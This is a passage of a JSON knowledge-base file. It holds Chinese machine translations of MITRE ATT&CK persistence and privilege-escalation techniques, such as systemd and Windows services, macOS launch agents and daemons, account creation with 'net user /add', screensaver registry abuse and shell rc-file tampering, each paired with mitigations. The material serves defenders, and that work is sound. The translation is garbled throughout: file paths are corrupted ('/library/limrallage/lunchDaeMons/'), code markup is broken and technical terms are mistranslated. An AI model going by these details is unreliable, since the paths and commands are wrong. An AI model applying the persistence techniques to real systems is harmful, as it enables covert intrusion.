          "type": "text",
          "content": "几个类似Unix的系统已移至SystemD并弃用了RC脚本的使用。现在，这是MACOS中的一种弃用机制，支持LaunchD。该技术可以在Mac OS X Panther V10.3和早期版本上使用，该版本仍执行RC脚本。为了保持向后兼容性，某些系统（例如Ubuntu）将执行RC脚本，如果它们具有正确的文件权限。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，因此只有授权用户才能编辑rc.common文件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1037.005",
    "name": "Startup Items",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Initialization Scripts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用在启动初始化时自动执行的启动项目来建立持久性。启动项目在启动过程的最后阶段执行，并包含Shell脚本或其他可执行文件以及系统使用的配置信息，以确定所有启动项目的执行顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "从技术上讲，这是一种弃用的技术（被启动守护程序取代），因此，默认情况下，适当的文件夹"
        },
        {
          "type": "code",
          "content": "/library/startupitems "
        },
        {
          "type": "text",
          "content": "不保证在系统上存在，但默认情况下确实存在Macos Sierra。启动项目是一个目录，其可执行文件和配置属性列表（PLIST），"
        },
        {
          "type": "code",
          "content": " startupparameters.plist "
        },
        {
          "type": "text",
          "content": "，位于顶级目录中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在启动Utems目录中创建适当的文件夹/文件以注册自己的持久性机制。此外，由于启动项目在MACOS的启动阶段运行，因此它们将作为升高的根用户运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "由于不推荐使用startupitems，因此阻止所有用户写入"
            },
            {
              "type": "code",
              "content": "/library/startupitems "
            },
            {
              "type": "text",
              "content": "目录将阻止任何启动项目被注册。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1136.001",
    "name": "Local Account",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Create Account",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建一个本地帐户，以维持对受害者系统的访问。本地帐户是由组织配置的，供用户使用，远程支持，服务或单个系统或服务上的管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，有了足够的访问级别，Windows "
        },
        {
          "type": "code",
          "content": " NET用户 /add < /code>命令可用于创建本地帐户。在MacOS系统上， dscl -create "
        },
        {
          "type": "text",
          "content": "命令可用于创建本地帐户。通常，通常通过通用网络设备CLI命令（例如"
        },
        {
          "type": "code",
          "content": "用户名"
        },
        {
          "type": "text",
          "content": "）或使用"
        },
        {
          "type": "code",
          "content": " kubectl "
        },
        {
          "type": "text",
          "content": "实用程序将本地帐户添加到网络设备中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些帐户可用于建立次要凭证访问，而该访问不需要持续的远程访问工具要在系统上部署。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制允许创建其他帐户的帐户数量。限制用于日常运营的本地管理员帐户的使用，这些帐户可能会使它们暴露于潜在的对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1136.002",
    "name": "Domain Account",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Create Account",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建一个域帐户，以维持对受害者系统的访问。域帐户是由Active Directory域服务管理的域帐户，在该服务域服务中，在该域的一部分中配置了访问和权限。域帐户可以涵盖用户，管理员和服务帐户。有了足够的访问级别，<code> NET用户 /add /domain < /code>命令可用于创建域帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些帐户可用于建立次要凭证访问，而该访问不需要持续的远程访问工具要在系统上部署。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "配置访问控件和防火墙，以限制访问域控制器和用于创建和管理帐户的系统。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "通过确保关键服务器的适当安全配置来保护域控制器。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制具有权限创建其他帐户的帐户数量。请勿将域管理员帐户用于日常操作，这可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1136.003",
    "name": "Cloud Account",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Create Account",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建一个云帐户以维持对受害者系统的访问。有了足够的访问级别，可以使用此类帐户来建立次要凭证访问，而辅助访问不需要持续的远程访问工具要在系统上部署。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以创建只能访问特定云服务的帐户，这可以减少检测的机会。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦对手创建了一个云帐户，他们就可以操纵该帐户以确保持久性并允许访问其他资源 - 例如，通过添加其他云凭证或分配其他云角色。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "配置访问控件和防火墙，以限制对关键系统和域控制器的访问。大多数云环境都支持单独的虚拟私有云（VPC）实例，以进一步分割云系统。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制具有权限创建其他帐户的帐户数量。请勿将特权帐户用于日常运营，这些帐户可能会使他们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.001",
    "name": "Launch Agent",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建或修改发射代理，以反复执行恶意有效载荷，这是持久性的一部分。当用户登录时，启动了每个用户启动过程，该进程从属性列表（.plist）文件中加载每个启动按需用户代理的参数>，"
        },
        {
          "type": "code",
          "content": "/library/启动代码"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/library/launchagents "
        },
        {
          "type": "text",
          "content": "。属性列表文件使用"
        },
        {
          "type": "code",
          "content": " Label "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " programArguments "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "键来识别启动代理的名称，可执行文件位置和执行时间。通常安装启动代理以执行对程序的更新，在登录处启动用户指定的程序或执行其他开发人员任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "发射代理也可以使用launchctl命令执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装新的启动代理，该代理通过将.plist文件放入使用"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " keepalive "
        },
        {
          "type": "text",
          "content": "键设置为"
        },
        {
          "type": "code",
          "content": " true </code的"
        },
        {
          "type": "text",
          "content": " keepalive </code> keepalive </code> keepalive </code>键来执行登录。>。可以使用相关操作系统或良性软件的名称掩饰启动代理名称。启动代理具有用户级特权创建，并具有用户级别权限执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将组策略设置为将文件权限限制为"
            },
            {
              "type": "code",
              "content": "〜/启动器"
            },
            {
              "type": "text",
              "content": "文件夹。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.002",
    "name": "Systemd Service",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改SystemD服务，以反复执行恶意有效载荷，这是持久性的一部分。SystemD是一种系统和服务经理，通常用于管理背景守护程序过程（也称为服务）和其他系统资源。SystemD是许多Linux分布上的默认初始化（INIT）系统，取代了旧版INIT系统，包括Sysvinit和Upstart，同时使后退兼容。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SystemD使用"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件扩展名）使用单元配置文件来编码有关服务过程的信息。默认情况下，系统级单元文件存储在根拥有目录的"
        },
        {
          "type": "code",
          "content": "/Systemd/System "
        },
        {
          "type": "text",
          "content": "目录中（"
        },
        {
          "type": "code",
          "content": "/"
        },
        {
          "type": "text",
          "content": "）。用户级单元文件存储在用户拥有目录的"
        },
        {
          "type": "code",
          "content": "/Systemd/user "
        },
        {
          "type": "text",
          "content": "目录中（"
        },
        {
          "type": "code",
          "content": " $ $ home "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "单元文件中，以下指令用于执行命令："
        }
      ],
      [
        {
          "type": "list",
          "content": "ExecStart，Execstartpre和ExecstartPost指令在通过SystemCtl手动启动服务或系统启动时执行，如果设置了服务自动启动。"
        },
        {
          "type": "list",
          "content": "当服务重新启动时，ExecReload指令执行。"
        },
        {
          "type": "list",
          "content": "停止服务时，ExecStop，ExecStoppre和ExecStopost Dicctions执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手已经创建了新的服务文件，更改了命令a "
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件的指令执行，并修改了用户指令a "
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件>文件执行为AS，这可能会导致特权升级。对手也可以在这些目录中放置符号链接，从而使SystemD能够找到这些有效载荷，而不管它们驻留在文件系统上。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "仅将软件安装限制在受信任的存储库中，并谨慎对待孤儿软件包。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "SystemD Service单元文件的创建和修改通常保留给管理员，例如Linux root用户和其他具有Superuser特权的用户。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对SystemD单元文件的读/写入访问仅选择具有合法需要管理系统服务的特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将用户对系统实用程序（例如"
            },
            {
              "type": "code",
              "content": " systemctl "
            },
            {
              "type": "text",
              "content": "）的访问仅限于有合法需求的用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.003",
    "name": "Windows Service",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改Windows服务，以反复执行恶意有效载荷，这是持久性的一部分。当Windows启动时，它会启动程序或称为执行背景系统功能的服务的应用程序。Windows注册表中存储了Windows Service Service配置信息，包括服务可执行文件或恢复程序/命令的文件路径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装新服务或修改现有服务以在启动时执行以持续到系统上。可以使用系统实用程序（例如SC.EXE），直接修改注册表或直接与Windows API进行交互来设置或修改服务配置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用服务来安装和执行恶意驱动程序。例如，将驱动程序文件（ex："
        },
        {
          "type": "code",
          "content": " .sys "
        },
        {
          "type": "text",
          "content": "）删除后，可以通过本机API函数（例如"
        },
        {
          "type": "code",
          "content": " createServicew（）"
        },
        {
          "type": "text",
          "content": "（或手动手动）加载和注册。通过诸如"
        },
        {
          "type": "code",
          "content": " zwloadDriver（）"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " zwsetValueKey（）"
        },
        {
          "type": "text",
          "content": "）之类的函数，通过创建所需的服务注册表值（即修改注册表）或使用命令行实用程序，例如<代码> pnputil.exe </code>。对手可能会利用这些驱动器作为根孔来隐藏系统上恶意活动的存在。对手还可以将签名但脆弱的驱动程序加载到受损的机器上（称为“带您自己的脆弱驱动程序”（ByoVD）），作为特权升级的开发的一部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用管理员特权创建服务，但在系统特权下执行，因此对手也可以使用服务来升级特权。对手也可以通过服务执行直接启动服务。为了使检测分析更具挑战性，恶意服务还可以包含化装舞会任务或服务（例如：使用与合法的OS或Banign Office Software组件相关的服务和/或有效载荷名称）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内系统的特权和服务滥用机会并纠正它们的审计工具。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止应用程序写入系统的签名脆弱驱动程序。在Windows 10和11上，启用Microsoft脆弱的驱动器放置列表，以帮助对抗第三方开发的服务驱动程序。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，只有合法签署的服务驱动程序的注册和执行。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保使驾驶员签名执行能够限制未签名的驱动程序的安装。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务配置进行交互。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.004",
    "name": "Launch Daemon",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改启动守护程序，以执行恶意有效载荷，这是持久性的一部分。启动守护程序是用于与MACOS使用的服务管理框架进行交互的PLIST文件。启动守护程序需要安装提高特权，在登录之前为系统上的每个用户执行，并在后台运行而无需用户交互。在MACOS初始化启动期间，启动过程从"
        },
        {
          "type": "code",
          "content": "/system/library/lunagredaemons/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/library/limrallage/lunchDaeMons/"
        },
        {
          "type": "text",
          "content": "。所需的启动Daemons参数包括"
        },
        {
          "type": "code",
          "content": " Label "
        },
        {
          "type": "text",
          "content": "以识别任务，"
        },
        {
          "type": "code",
          "content": " program "
        },
        {
          "type": "text",
          "content": "以提供可执行文件的路径，"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "以指定任务是什么时候跑步。启动守护程序通常用于提供共享资源，软件更新或执行自动化任务的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过使用"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "参数设置为"
        },
        {
          "type": "code",
          "content": " true "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " program "
        },
        {
          "type": "text",
          "content": "参数设置为恶意可执行可执行路径的</code> program> programe </code> parame </code> parameter设置为"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "。守护程序名称可以通过使用相关操作系统或良性软件的名称（即伪装）来掩饰。执行启动守护程序后，该程序继承了管理权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，系统配置更改（例如安装第三方软件软件的安装）可能会导致诸如"
        },
        {
          "type": "code",
          "content": " usr/local/bin/bin "
        },
        {
          "type": "text",
          "content": "之类的文件夹在全球上可写。因此，差的配置可以允许对手修改当前启动守护程序的PLIST文件引用的可执行文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够在系统上检测文件夹权限滥用机会的审计工具，尤其是通过第三方软件对文件夹进行的更改。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能创建新的启动守护程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.001",
    "name": "Change Default File Association",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行文件类型关联触发的恶意内容来建立持久性。打开文件时，检查了用于打开文件（也称为文件关联或处理程序）的默认程序。文件关联选择存储在Windows注册表中，可以由具有注册表访问权限的用户，管理员或程序进行编辑，或者使用内置关联实用程序的管理员进行编辑。当打开具有给定扩展程序的文件时，应用程序可以修改给定文件扩展名的文件关联，以调用任意程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "系统文件关联在"
        },
        {
          "type": "code",
          "content": " hkey_classes_root中列出。条目指向位于 hkey_classes_root \\ [Handler] "
        },
        {
          "type": "text",
          "content": "的该扩展程序的处理程序。然后将各种命令列为"
        },
        {
          "type": "code",
          "content": " hkey_classes_root \\ [handler] \\ shell \\ [action] \\ command "
        },
        {
          "type": "text",
          "content": "的shell键下方的子键。例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ open \\命令"
        },
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ print \\命令"
        },
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ printto \\命令"
        }
      ],
      [
        {
          "type": "text",
          "content": "列出的键的值是处理程序打开文件扩展名时执行的命令。对手可以修改这些值以不断执行任意命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.002",
    "name": "Screensaver",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行用户无活动触发的恶意内容来建立持久性。屏幕保护程序是在用户不活动的可配置时间之后执行的程序，并由具有.scr文件扩展名的便携式可执行文件（PE）文件组成。Windows Screensaver应用程序scrnsave.scr位于"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 \\ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ syswow64 \\ "
        },
        {
          "type": "text",
          "content": "上，在64位Windows Systems上包含基础窗口安装。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下屏幕保护程序设置存储在注册表中（"
        },
        {
          "type": "code",
          "content": " hkcu \\ control面板\\ desktop \\ "
        },
        {
          "type": "text",
          "content": "），可以操纵以实现持久性："
        }
      ],
      [
        {
          "type": "list",
          "content": "scrnsave.exe-设置为恶意PE路径"
        },
        {
          "type": "list",
          "content": "屏幕释放 - 设置为“ 1”以启用屏幕保护程序"
        },
        {
          "type": "list",
          "content": "ScreenSaverissecure-设置为“ 0”以不需要密码来解锁"
        },
        {
          "type": "list",
          "content": "ScreenSaveTimeOut  - 在执行屏幕保护程序之前设置用户无效超时"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用屏幕保护程序设置来维持持久性，通过将屏幕保护程序设置为在一定的用户不活动时间内运行恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不必要，请使用组策略禁用屏幕保护程序。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "块.scr文件从非标准位置执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.003",
    "name": "Windows Management Instrumentation Event Subscription",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由Windows Management Instrumentation（WMI）事件订阅触发的恶意内容来建立持久性并提高特权。WMI可用于安装事件过滤器，提供商，消费者和绑定，并在定义事件发生时执行代码。可能订阅的事件的示例包括壁时钟时间，用户循环或计算机的正常运行时间。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用WMI的功能来订阅事件并在此事件发生时执行任意代码，从而在系统上持久。对手还可以将WMI脚本编译到Windows Management对象（MOF）文件（.MOF扩展名）中，该文件可用于创建恶意订阅。"
        }
      ],
      [
        {
          "type": "text",
          "content": "WMI订阅执行由WMI提供商主机流程（WMIPRVSE.EXE）代理，因此可能导致系统特权提高。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止恶意软件滥用WMI达到持久性。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "防止管理员和特权帐户系统之间的凭据重叠。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "默认情况下，仅允许管理员使用WMI远程连接；限制允许连接或禁止所有用户连接到WMI的其他用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.004",
    "name": "Unix Shell Configuration Modification",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行用户外壳触发的恶意命令来建立持久性。用户Unix Shell基于事件在整个会话中在不同点执行几个配置脚本。例如，当用户打开命令行接口或远程登录时（例如通过SSH）启动登录外壳。登录外壳从系统（"
        },
        {
          "type": "code",
          "content": "/etc "
        },
        {
          "type": "text",
          "content": "）和用户的主目录（"
        },
        {
          "type": "code",
          "content": "〜/"
        },
        {
          "type": "text",
          "content": "）执行脚本以配置环境。启动时系统使用 /etc /配置文件上的所有登录外壳。这些配置脚本以其目录的许可级别运行，通常用于设置环境变量，创建别名并自定义用户的环境。当外壳退出或终止时，执行其他外壳脚本，以确保适当地退出外壳。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会试图通过将命令插入由外壳自动执行的脚本中来建立持久性。以bash为例，大多数GNU/Linux系统的默认外壳，对手可能会添加命令，这些命令将恶意二进制文件启动到"
        },
        {
          "type": "code",
          "content": "/etc/profile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " /etc/profile.d </code </code </code "
        },
        {
          "type": "text",
          "content": " </code.d </code。>文件。这些文件通常需要ROOT权限进行修改并每次启动系统上的任何外壳时都会执行。对于用户级别的权限，对手可以将恶意命令插入"
        },
        {
          "type": "code",
          "content": "〜/.bash_profile "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "〜/.bash_login "
        },
        {
          "type": "text",
          "content": "，或"
        },
        {
          "type": "code",
          "content": "〜/.profile </.profile "
        },
        {
          "type": "text",
          "content": "当用户打开命令行接口或远程连接时。由于系统仅在列出的顺序中执行第一个现有文件，因此对手使用"
        },
        {
          "type": "code",
          "content": "〜/.bash_profile "
        },
        {
          "type": "text",
          "content": "来确保执行。对手还利用了"
        },
        {
          "type": "code",
          "content": "〜/.bashrc "
        },
        {
          "type": "text",
          "content": "文件，如果建立连接是远程建立或打开其他交互式壳，例如命令行界面中的新选项卡。一些恶意软件针对终止程序以触发执行的终止，对手可以使用"
        },
        {
          "type": "code",
          "content": "〜/.bash_logout "
        },
        {
          "type": "text",
          "content": "文件在会话结束时执行恶意命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于MACOS，该技术的功能相似，但可能会利用ZSH（MacOS 10.15+的默认外壳）。打开终端时，应用程序会启动ZSH登录外壳和ZSH Interactive shell。登录外壳使用"
        },
        {
          "type": "code",
          "content": "/etc/profile "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "/etc/zshenv "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "/etc/zprofile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/etc，使用/etc/profile "
        },
        {
          "type": "text",
          "content": "/etc/zshenv </code>/etc，使用登录外壳配置系统环境/zlogin </code>。然后，登录外壳将用户环境配置为"
        },
        {
          "type": "code",
          "content": "〜/.zprofile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/.zlogin "
        },
        {
          "type": "text",
          "content": "。交互式外壳使用"
        },
        {
          "type": "code",
          "content": "〜/.zshrc "
        },
        {
          "type": "text",
          "content": "来配置用户环境。退出后，执行了"
        },
        {
          "type": "code",
          "content": "/etc/zlogout "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/.zlogout "
        },
        {
          "type": "text",
          "content": "。对于旧版程序，MacOS在启动时执行"
        },
        {
          "type": "code",
          "content": "/etc/bashrc "
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使这些文件不变，只有某些管理员才能改变，将限制对手轻松创建用户级别持久性的能力。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.005",
    "name": "Trap",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由中断信号触发的恶意内容来建立持久性。"
        },
        {
          "type": "code",
          "content": " TRAP "
        },
        {
          "type": "text",
          "content": "命令允许程序和Shells指定在接收中断信号时将执行的命令。一个常见的情况是一个脚本，允许优雅终止和处理常见键盘中断，例如"
        },
        {
          "type": "code",
          "content": " ctrl+c "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " ctrl+d "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当外壳遇到特定的中断作为持久机制时，对手可以使用它来注册代码。陷阱命令是以下格式"
        },
        {
          "type": "code",
          "content": "陷阱'命令列表'信号"
        },
        {
          "type": "text",
          "content": "在收到“信号”时将执行“命令列表”。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.006",
    "name": "LC_LOAD_DYLIB Addition",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行被污染的二进制文件触发的恶意内容来建立持久性。Mach-O二进制文件具有一系列的标题，这些标头用于加载二进制时，用于执行某些操作。Mach-O二进制中的LC_LOAD_DYLIB标头告诉MacOS和OS X在执行时间内，动态库（Dylibs）的加载。只要对其他领域和依赖项进行调整，就可以将这些临时添加到编译的二进制中。有可以执行这些更改的工具。"
        }
      ],
      [
        {
          "type": "text",
          "content": "每次执行二进制文件时，对手可能会修改Mach-O二进制标头，以加载和执行恶意Dylibs。尽管由于修改了二进制文件，因此任何更改都会使二进制文件的数字签名无效，但是可以通过简单地从二进制中删除LC_CODE_SIGNATARE命令来进行修复，以便未在加载时检查签名。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
